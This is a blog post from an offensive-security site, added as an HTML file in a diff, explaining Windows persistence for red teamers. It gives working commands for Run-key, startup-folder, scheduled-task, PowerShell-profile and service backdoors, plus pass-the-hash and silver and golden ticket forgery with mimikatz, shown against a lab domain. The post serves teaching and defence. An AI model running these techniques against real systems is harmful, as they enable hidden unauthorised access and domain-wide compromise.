@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">A View of Persistence</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#c2-vs-privilege">C2 vs Privilege</a></li>
+    <li><a href="#c2">C2</a>
+      <ul>
+        <li><a href="#userland-vs-elevated">Userland vs Elevated</a></li>
+      </ul>
+    </li>
+    <li><a href="#maintaining-privilege">Maintaining Privilege</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#be-strategic">Be Strategic</a></li>
+  </ul>
+</nav>
+    <blockquote>
+<p>Persistence, noun, the continued or prolonged existence of something.</p>
+</blockquote>
+<p>This is not something that usually gets much attention, despite it being a vital aspect of an attack lifecycle.  When reading up on subjects like the &ldquo;Cyber Kill Chain&rdquo;, we frequently see 7 main steps:</p>
+<ol>
+<li>Recon</li>
+<li>Weaponisation</li>
+<li>Delivery</li>
+<li>Exploitation</li>
+<li>Installation</li>
+<li>Command &amp; Control</li>
+<li>Actions on Objectives</li>
+</ol>
+<p>In this post, I want to run through some basic persistence strategies and techniques.</p>
+<h2 id="c2-vs-privilege">C2 vs Privilege</h2>
+<p>The installation step can be described as &ldquo;the installation of a backdoor on the compromised system, allowing an adversary to maintain persistence in the target environment&rdquo;.  The obvious translation is &ldquo;to regain command &amp; control over the system (should it be lost), without having to repeat steps 1 through 4.&rdquo;  For example, if we phish a user and establish C2 on their workstation, we need to ensure we can regain control should they reboot, or we kill our shell because we&rsquo;re noobs, without having to phish them again.</p>
+<p>However, &ldquo;maintaining persistence&rdquo; is much more than just regaining C2 over a single (or even multiple) system(s) - it&rsquo;s about maintaining levels of privilege and access across an envronment.</p>
+<p>If you have to repeat steps 1-4 to get back to a previous point, you are not being persistent.</p>
+<h2 id="c2">C2</h2>
+<h3 id="userland-vs-elevated">Userland vs Elevated</h3>
+<p>Typically, persistence mechanisms that trigger a C2 channel exist in one of the following levels:</p>
+<ol>
+<li>Medium Mandatory Level in the context of a standard user.</li>
+<li>High Mandatory Level in the context of SYSTEM.</li>
+</ol>
+<h4 id="userland-techniques">Userland Techniques</h4>
+<h5 id="hkcu">HKCU</h5>
+<p>Create a <code>REG_SZ</code> value in the <code>Run</code> key within <code>HKCU\Software\Microsoft\Windows</code>. (Other keys are available).</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Value name:  Backdoor
+Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+</code></pre></div><h5 id="start-up">Start-Up</h5>
+<p>Create a batch script in the user startup folder.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
+start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+</code></pre></div><h5 id="scheduled-tasks">Scheduled Tasks</h5>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; $A = New-ScheduledTaskAction -Execute &#34;cmd.exe&#34; -Argument &#34;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&#34;
+PS C:\&gt; $T = New-ScheduledTaskTrigger -AtLogOn -User &#34;Rasta&#34;
+PS C:\&gt; $P = New-ScheduledTaskPrincipal &#34;Rasta&#34;
+PS C:\&gt; $S = New-ScheduledTaskSettingsSet
+PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
+</code></pre></div><p>There are multiple trigger options to explore.</p>
+<h5 id="powershell-profiles">PowerShell Profiles</h5>
+<p>If your user is a heavy PowerShell user, backdoor their PowerShell profile.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; Test-Path $profile
+False
+
+PS C:\&gt; New-Item -Path $profile -Type File –Force
+
+    Directory: C:\Users\Rasta\Documents\WindowsPowerShell
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       22/03/2018     12:42              0 Microsoft.PowerShell_profile.ps1
+
+PS C:\&gt; $string = &#39;Start-Process &#34;cmd.exe&#34;&#39;
+PS C:\&gt; $string | Out-File -FilePath &#34;C:\Users\Rasta\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&#34; -Append
+</code></pre></div><h4 id="elevated-techniques">Elevated Techniques</h4>
+<h5 id="hklm">HKLM</h5>
+<p>Similar to HKCU.  Create a <code>REG_SZ</code> value in the <code>Run</code> key within <code>HKLM\Software\Microsoft\Windows</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Value name:  Backdoor
+Value data:  C:\Windows\Temp\backdoor.exe
+</code></pre></div><h5 id="services">Services</h5>
+<p>Create a service that will start automatically or on-demand.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; New-Service -Name &#34;Backdoor&#34; -BinaryPathName &#34;C:\Windows\Temp\backdoor.exe&#34; -Description &#34;Nothing to see here.&#34;
+</code></pre></div><h5 id="scheduled-tasks-1">Scheduled Tasks</h5>
+<p>Scheduled Task to run as SYSTEM, everyday at 9am.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; $A = New-ScheduledTaskAction -Execute &#34;cmd.exe&#34; -Argument &#34;/c C:\Windows\Temp\backdoor.exe&#34;
+PS C:\&gt; $T = New-ScheduledTaskTrigger -Daily -At 9am
+PS C:\&gt; $P = New-ScheduledTaskPrincipal &#34;NT AUTHORITY\SYSTEM&#34; -RunLevel Highest
+PS C:\&gt; $S = New-ScheduledTaskSettingsSet
+PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
+</code></pre></div><h2 id="maintaining-privilege">Maintaining Privilege</h2>
+<h5 id="passwords">Passwords</h5>
+<p>Steal clear text passwords and use them with <code>runas</code> or other session spawning functionality.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;dir \\fs01\c$
+Access is denied.
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;runas /netonly /user:FS01\Administrator cmd
+Enter the password for FS01\Administrator:
+Attempting to start cmd as user &#34;FS01\Administrator&#34; ...
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Windows\system32&gt;dir \\fs01\c$
+ Volume in drive \\fs01\c$ has no label.
+ Volume Serial Number is 069A-2329
+
+ Directory of \\fs01\c$
+
+16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
+14/10/2017  10:26    &lt;DIR&gt;          Program Files
+16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
+22/03/2018  14:57    &lt;DIR&gt;          Users
+22/03/2018  14:57    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  41,994,084,352 bytes free
+</code></pre></div><h5 id="ntlm-hashes">NTLM hashes</h5>
+<p>If you can&rsquo;t get passwords, use NTLM hashes with techniques such as Pass-the-Hash or psexec.  Both domain accounts and local accounts can work.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;dir \\fs01\c$
+Access is denied.
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">mimikatz # sekurlsa::pth /user:Administrator /domain:FS01 /rc4:fc525c9683e8fe067095ba2ddc971889 /ptt
+user    : Administrator
+domain  : FS01
+program : cmd.exe
+impers. : no
+NTLM    : fc525c9683e8fe067095ba2ddc971889
+  |  PID  3876
+  |  TID  2952
+  |  LSA Process is now R/W
+  |  LUID 0 ; 691999 (00000000:000a8f1f)
+  \_ msv1_0   - data copy @ 00000214BC31C610 : OK !
+  \_ kerberos - data copy @ 00000214BC5529B8
+   \_ aes256_hmac       -&gt; null
+   \_ aes128_hmac       -&gt; null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace -&gt; null
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Windows\system32&gt;dir \\fs01\c$
+ Volume in drive \\fs01\c$ has no label.
+ Volume Serial Number is 069A-2329
+
+ Directory of \\fs01\c$
+
+16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
+14/10/2017  10:26    &lt;DIR&gt;          Program Files
+16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
+22/03/2018  14:57    &lt;DIR&gt;          Users
+22/03/2018  14:57    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  41,993,674,752 bytes free
+</code></pre></div><h5 id="local-groups">Local Groups</h5>
+<p>Adding new local users can provide a method of getting back into machines.  If placing them in the <code>Administrators</code> group is too obvious, use other privileged groups such as <code>Remote Desktop Users</code>, <code>Remote Management Users</code> or <code>Backup Operators</code>.</p>
+<h5 id="domain-groups">Domain Groups</h5>
+<p>Often times, domain groups are created to administer groups of machines by granting local admin privilege over them.  Adding your own domain account to these groups can provide you persistent access to multiple machines at once.</p>
+<h5 id="silver-tickets">Silver Tickets</h5>
+<p>With the NTLM hash of a computer account, silver tickets can be used to regain local admin privileges via the CIFS service.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">* Username : FS01$
+* Domain   : LAB
+* NTLM     : 47b1d9d581f29b3b43845692bd4a0322
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;dir \\fs01\c$
+Access is denied.
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt
+User      : Administrator
+Domain    : testlab.local (TESTLAB)
+SID       : S-1-5-21-1516486103-3973840447-1748718438
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 47b1d9d581f29b3b43845692bd4a0322 - rc4_hmac_nt
+Service   : cifs
+Target    : fs01
+Lifetime  : 22/03/2018 15:25:33 ; 19/03/2028 15:25:33 ; 19/03/2028 15:25:33
+-&gt; Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for &#39;Administrator @ testlab.local&#39; successfully submitted for current session
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;dir \\fs01\c$
+ Volume in drive \\fs01\c$ has no label.
+ Volume Serial Number is 069A-2329
+
+ Directory of \\fs01\c$
+
+16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
+14/10/2017  10:26    &lt;DIR&gt;          Program Files
+16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
+22/03/2018  14:57    &lt;DIR&gt;          Users
+22/03/2018  14:57    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  41,994,330,112 bytes free
+</code></pre></div><h5 id="golden-tickets">Golden Tickets</h5>
+<p>Golden tickets can be used to forge access to any service in the domain.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 22/03/2018 14:49:02
+Object Security ID   : S-1-5-21-1516486103-3973840447-1748718438-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9063b8edb3d04ed734edd49e5b0adef3
+    ntlm- 0: 9063b8edb3d04ed734edd49e5b0adef3
+    lm  - 0: be97fc24cf1ad2cc2d193430d113f45c
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;dir \\dc01\c$
+Access is denied.
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /rc4:9063b8edb3d04ed734edd49e5b0adef3 /ptt
+User      : Administrator
+Domain    : testlab.local (TESTLAB)
+SID       : S-1-5-21-1516486103-3973840447-1748718438
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 9063b8edb3d04ed734edd49e5b0adef3 - rc4_hmac_nt
+Lifetime  : 22/03/2018 15:36:25 ; 19/03/2028 15:36:25 ; 19/03/2028 15:36:25
+-&gt; Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for &#39;Administrator @ testlab.local&#39; successfully submitted for current session
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\rasta&gt;dir \\dc01\c$
+ Volume in drive \\dc01\c$ has no label.
+ Volume Serial Number is 069A-2329
+
+ Directory of \\dc01\c$
+
+16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
+14/10/2017  10:26    &lt;DIR&gt;          Program Files
+16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
+22/03/2018  14:42    &lt;DIR&gt;          Users
+22/03/2018  14:48    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  41,120,235,520 bytes free
+</code></pre></div><h2 id="be-strategic">Be Strategic</h2>
+<p>You should always have an idea of what your persistence strategy will be.  Take the time to understand the limitations and advantages of each technique.  Experiment with different payloads such as PowerShell, PE&rsquo;s, DLLs and scriptlets.  Learn about staged and stageless payloads and where they work best.  Consider the use of different transports like HTTP/S, SMB and DNS.</p>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/laps-pt2/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/brucon-18/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
